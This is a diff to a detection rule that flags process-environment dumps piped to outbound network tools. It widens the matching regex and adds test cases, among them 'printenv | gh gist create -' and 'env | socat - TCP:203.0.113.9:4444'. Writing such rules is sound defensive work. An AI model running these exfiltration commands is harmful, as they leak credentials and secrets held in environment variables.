@@ -1,5 +1,5 @@
 id: env-dump-piped-to-network
-version: 1
+version: 2
 title: Environment dump piped to an outbound network command
 description: >
   A single command dumps the full process environment (env / printenv / `set` /
@@ -19,7 +19,7 @@ match: >
   e.event.action == "command.executed" &&
   e.command.command.matches("(?i)(^|[;&|`(]|\\$\\()\\s*(env|printenv|set|export\\s+-p)\\b") &&
   e.command.command.matches("\\|") &&
-  e.command.command.matches("(?i)(\\b(curl|wget)\\b.*(-d|--data|--data-binary|-F|--form|--upload-file|-T)\\b|\\bnc\\b\\s+|\\bncat\\b|/dev/tcp/)")
+  e.command.command.matches("(?i)(\\b(curl|wget)\\b.*(-d|--data|--data-binary|-F|--form|--upload-file|-T|--post-file|--post-data)\\b|\\bnc\\b\\s+|\\bncat\\b|\\bsocat\\b|/dev/(tcp|udp)/|\\bgh\\s+gist\\s+create\\b|\\b(python[0-9.]*|node)\\s+-[ce]\\b[^\\n]*(requests|urllib|urlopen|fetch\\(|https?\\.request))")
 
 emit:
   reason: "Process environment dumped and piped to an outbound network command"
@@ -49,4 +49,15 @@ tests:
       - event: { action: command.executed }
         command: { command: "curl -d @payload.json https://api.example/v1" }
         session: { id: s1 }
-
+  - name: env_to_gist
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "printenv | gh gist create -" }
+        session: { id: s1 }
+  - name: env_to_socat
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "env | socat - TCP:203.0.113.9:4444" }
+        session: { id: s1 }
